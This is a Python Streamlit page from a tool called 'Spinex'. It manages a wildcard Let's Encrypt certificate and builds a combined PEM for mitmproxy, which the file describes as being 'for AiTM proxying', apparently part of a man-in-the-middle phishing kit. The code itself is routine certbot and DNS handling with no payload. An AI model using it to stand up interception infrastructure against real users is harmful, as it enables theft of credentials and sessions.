"""
cert_page.py — Spinex TLS Certificate Page

Handles fetching, renewing, and monitoring the wildcard Let's Encrypt
certificate needed for AiTM proxying.
"""

import streamlit as st
import os
import sys
import datetime

_AITM_DIR = os.path.dirname(os.path.abspath(__file__))
if _AITM_DIR not in sys.path:
    sys.path.insert(0, _AITM_DIR)
import config_manager as cm
import cert_manager   as certm

_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');

:root {
    --bg:      #0a0a0f;
    --surface: #111118;
    --border:  #1e1e2e;
    --accent:  #00ff9d;
    --accent2: #ff3c6e;
    --accent3: #7c5cff;
    --text:    #e2e2f0;
    --muted:   #6b6b8a;
    --ok:      #00ff9d;
    --warn:    #ffcc00;
    --fail:    #ff3c6e;
}

html, body, [data-testid="stAppViewContainer"] {
    background: var(--bg) !important;
    font-family: 'Syne', sans-serif;
    color: var(--text);
}

h1, h2, h3 { font-family: 'Syne', sans-serif; font-weight: 800; letter-spacing: -0.03em; }

.badge {
    display: inline-block; padding: 2px 10px; border-radius: 100px;
    font-family: 'JetBrains Mono', monospace; font-size: 0.72rem;
    font-weight: 600; letter-spacing: 0.05em;
}
.badge-ok   { background:#00ff9d18; color:var(--ok);  border:1px solid #00ff9d44; }
.badge-warn { background:#ffcc0018; color:var(--warn); border:1px solid #ffcc0044; }
.badge-fail { background:#ff3c6e18; color:var(--fail); border:1px solid #ff3c6e44; }
.badge-info { background:#7c5cff18; color:var(--accent3); border:1px solid #7c5cff44; }

.stat-box {
    background: var(--surface); border: 1px solid var(--border);
    border-radius: 8px; padding: 1.2rem 1.5rem; text-align: center;
}
.stat-label { font-size: 0.7rem; font-weight: 700; letter-spacing: 0.15em;
              text-transform: uppercase; color: var(--muted); margin-bottom: 4px; }
.stat-value { font-family: 'JetBrains Mono', monospace; font-size: 1.6rem;
              font-weight: 700; color: var(--text); }
.stat-value.ok   { color: var(--ok); }
.stat-value.warn { color: var(--warn); }
.stat-value.fail { color: var(--fail); }

.step-box {
    background: var(--surface); border: 1px solid var(--border);
    border-left: 3px solid var(--accent3);
    border-radius: 0 8px 8px 0; padding: 1rem 1.2rem; margin-bottom: 0.6rem;
}
.step-num { font-family:'JetBrains Mono',monospace; font-size:0.72rem;
            color:var(--accent3); font-weight:700; letter-spacing:0.1em; }

.accent-line { width:40px; height:3px; background:var(--accent); border-radius:2px; margin-bottom:0.5rem; }
</style>
"""

PROVIDER_LABELS = {
    "cloudflare":   "☁️  Cloudflare",
    "route53":      "🟠 AWS Route53",
    "digitalocean": "🌊 DigitalOcean",
    "manual":       "🖐️  Manual (copy-paste TXT record)",
}

PROVIDER_HELP = {
    "cloudflare": (
        "Get your API token from Cloudflare dashboard → My Profile → API Tokens. "
        "Create a token with **Zone:DNS:Edit** permission for your domain."
    ),
    "route53": (
        "Uses AWS credentials from environment variables "
        "(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION). "
        "Ensure the IAM role has Route53 change permissions."
    ),
    "digitalocean": (
        "Get your personal access token from DigitalOcean control panel → "
        "API → Generate New Token. Needs read+write scope."
    ),
    "manual": (
        "You'll be given a DNS TXT record to add manually. "
        "Best for DNS providers without certbot plugins."
    ),
}


def _badge(text: str, kind: str) -> str:
    return f'<span class="badge badge-{kind}">{text}</span>'


def _render_status_cards(status: certm.CertStatus) -> None:
    c1, c2, c3, c4 = st.columns(4)

    # Exists
    with c1:
        val_class = "ok" if status.exists else "fail"
        val_text  = "YES" if status.exists else "NO"
        st.markdown(
            f'<div class="stat-box"><div class="stat-label">Cert on disk</div>'
            f'<div class="stat-value {val_class}">{val_text}</div></div>',
            unsafe_allow_html=True,
        )

    # Valid
    with c2:
        val_class = "ok" if status.valid else "fail"
        val_text  = "VALID" if status.valid else ("EXPIRED" if status.exists else "—")
        st.markdown(
            f'<div class="stat-box"><div class="stat-label">Status</div>'
            f'<div class="stat-value {val_class}">{val_text}</div></div>',
            unsafe_allow_html=True,
        )

    # Days left
    with c3:
        if status.days_left is not None:
            val_class = "ok" if status.days_left > 30 else ("warn" if status.days_left > 7 else "fail")
            val_text  = str(status.days_left)
        else:
            val_class = "muted"
            val_text  = "—"
        st.markdown(
            f'<div class="stat-box"><div class="stat-label">Days left</div>'
            f'<div class="stat-value {val_class}">{val_text}</div></div>',
            unsafe_allow_html=True,
        )

    # Combined PEM
    with c4:
        val_class = "ok" if status.combined_ok else "fail"
        val_text  = "READY" if status.combined_ok else "MISSING"
        st.markdown(
            f'<div class="stat-box"><div class="stat-label">mitmproxy PEM</div>'
            f'<div class="stat-value {val_class}">{val_text}</div></div>',
            unsafe_allow_html=True,
        )


def render() -> None:
    st.markdown(_CSS, unsafe_allow_html=True)

    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
    st.markdown("# TLS Certificate")
    st.markdown(
        '<p style="color:var(--muted);margin-top:-0.5rem;">'
        'Fetch and manage your wildcard Let\'s Encrypt certificate for AiTM proxying.</p>',
        unsafe_allow_html=True,
    )

    cfg = cm.load()
    base  = cfg["domain"]["base"].strip()
    email = cfg["domain"]["acme_email"].strip()

    if not base or not email:
        st.warning(
            "⚠️  Base domain and ACME email are not configured. "
            "Go to **⚙️ AiTM Config** first."
        )
        return

    st.markdown(f'Domain: `*.{base}` &nbsp;&nbsp; Email: `{email}`', unsafe_allow_html=True)
    st.divider()

    st.markdown("### 🔒 Certificate Status")

    status = certm.get_cert_status(cfg)
    _render_status_cards(status)

    if status.error:
        st.markdown(
            f'<p style="color:var(--muted);font-family:\'JetBrains Mono\',monospace;'
            f'font-size:0.8rem;margin-top:0.5rem;">{status.error}</p>',
            unsafe_allow_html=True,
        )

    if status.exists and status.expiry:
        st.caption(f"Expires: {status.expiry.strftime('%Y-%m-%d %H:%M UTC')}")

    if status.needs_renewal and status.exists:
        st.warning(f"⚠️  Certificate expires in {status.days_left} days — renewal recommended.")

    st.divider()

    tab_fetch, tab_renew, tab_manual = st.tabs([
        "🆕 Fetch new cert",
        "🔄 Renew existing",
        "🔧 Build combined PEM",
    ])

    with tab_fetch:
        st.markdown("Fetch a new wildcard certificate via Let's Encrypt DNS-01 challenge.")

        provider = st.selectbox(
            "DNS provider",
            options=list(PROVIDER_LABELS.keys()),
            format_func=lambda k: PROVIDER_LABELS[k],
            help="Choose the DNS provider where your domain is registered.",
        )

        st.info(PROVIDER_HELP[provider])

        api_token = ""
        if provider in ("cloudflare", "digitalocean"):
            api_token = st.text_input(
                "API token",
                type="password",
                placeholder="Paste your API token here",
            )
        elif provider == "route53":
            st.markdown(
                '<p style="color:var(--muted);font-size:0.85rem;">'
                'Ensure these environment variables are set on your server:<br>'
                '<code>AWS_ACCESS_KEY_ID</code> &nbsp; '
                '<code>AWS_SECRET_ACCESS_KEY</code> &nbsp; '
                '<code>AWS_DEFAULT_REGION</code></p>',
                unsafe_allow_html=True,
            )

        propagation = st.slider(
            "DNS propagation wait (seconds)",
            min_value=30, max_value=300, value=60, step=10,
            help="How long certbot waits after adding the TXT record before verifying. "
                 "Increase if your DNS provider is slow.",
        )

        if provider == "manual":
            # Show the manual command, no button needed
            manual_cmd = (
                f"certbot certonly --manual --preferred-challenges dns "
                f"--agree-tos --email {email} "
                f"-d {base} -d *.{base}"
            )
            st.markdown("Run this on your server:")
            st.code(manual_cmd, language="bash")
            st.caption(
                "After certbot finishes, come back to the **🔧 Build combined PEM** tab."
            )
        else:
            if st.button("🚀 Fetch certificate", type="primary"):
                if provider in ("cloudflare", "digitalocean") and not api_token:
                    st.error("API token is required.")
                else:
                    with st.spinner(
                        f"Fetching wildcard cert for *.{base} — "
                        f"this can take 1–3 minutes…"
                    ):
                        success, output = certm.fetch_cert(
                            cfg, provider, api_token, propagation
                        )
                    if success:
                        st.success("✅ Certificate fetched successfully!")
                    else:
                        st.error("❌ Certificate fetch failed.")
                    st.code(output, language="text")
                    st.rerun()

    with tab_renew:
        if not status.exists:
            st.info("No certificate found yet — fetch one first.")
        else:
            st.markdown(
                f"Current cert expires: **{status.expiry.strftime('%Y-%m-%d') if status.expiry else 'unknown'}** "
                f"({status.days_left} days remaining)."
            )

            col_a, col_b = st.columns(2)
            with col_a:
                if st.button("🔄 Renew now", type="primary", use_container_width=True):
                    with st.spinner("Running certbot renew…"):
                        success, output = certm.renew_cert(cfg)
                    if success:
                        st.success("✅ Certificate renewed!")
                    else:
                        st.error("❌ Renewal failed.")
                    st.code(output, language="text")
                    st.rerun()

            with col_b:
                st.markdown(
                    '<p style="color:var(--muted);font-size:0.82rem;padding-top:0.7rem;">'
                    'Or set up auto-renewal via cron on your server:</p>',
                    unsafe_allow_html=True,
                )
                st.code("0 3 * * * certbot renew --quiet", language="bash")
                st.caption("Runs daily at 3 AM, renews if < 30 days remaining.")

    with tab_manual:
        cert_path, key_path = cm.get_cert_paths(cfg)
        st.markdown(
            "Combine your cert and private key into one PEM file for mitmproxy."
        )

        col1, col2 = st.columns(2)
        with col1:
            exists_cert = os.path.exists(cert_path) if cert_path else False
            st.markdown(
                f'cert: `{cert_path or "not set"}` &nbsp; '
                + (_badge("FOUND", "ok") if exists_cert else _badge("MISSING", "fail")),
                unsafe_allow_html=True,
            )
        with col2:
            exists_key = os.path.exists(key_path) if key_path else False
            st.markdown(
                f'key: `{key_path or "not set"}` &nbsp; '
                + (_badge("FOUND", "ok") if exists_key else _badge("MISSING", "fail")),
                unsafe_allow_html=True,
            )

        st.markdown(
            f'Output: `{certm.COMBINED_CERT}` &nbsp; '
            + (_badge("EXISTS", "ok") if status.combined_ok else _badge("NOT BUILT", "warn")),
            unsafe_allow_html=True,
        )
        st.markdown("")

        if st.button("🔧 Build combined PEM", type="primary"):
            ok, msg = certm.build_combined_pem(cfg)
            if ok:
                st.success(f"✅ {msg}")
            else:
                st.error(f"❌ {msg}")
            st.rerun()

    st.divider()

    with st.expander("📦 Install certbot + DNS plugin (if not installed)"):
        st.markdown("**On your Linux proxy server:**")
        provider_sel = st.selectbox(
            "Show install command for",
            options=list(PROVIDER_LABELS.keys()),
            format_func=lambda k: PROVIDER_LABELS[k],
            key="install_provider_sel",
        )

        install_cmds = {
            "cloudflare": (
                "pip install certbot certbot-dns-cloudflare\n"
                "# or via apt:\n"
                "apt install python3-certbot-dns-cloudflare"
            ),
            "route53": (
                "pip install certbot certbot-dns-route53\n"
                "# or via apt:\n"
                "apt install python3-certbot-dns-route53"
            ),
            "digitalocean": (
                "pip install certbot certbot-dns-digitalocean\n"
                "# or via apt:\n"
                "apt install python3-certbot-dns-digitalocean"
            ),
            "manual": (
                "pip install certbot\n"
                "# or via apt:\n"
                "apt install certbot"
            ),
        }
        st.code(install_cmds.get(provider_sel, ""), language="bash")

if __name__ == "__main__":
    st.set_page_config(
        page_title="Spinex — TLS Certificate",
        page_icon="🔒",
        layout="wide",
        initial_sidebar_state="collapsed",
    )
    render()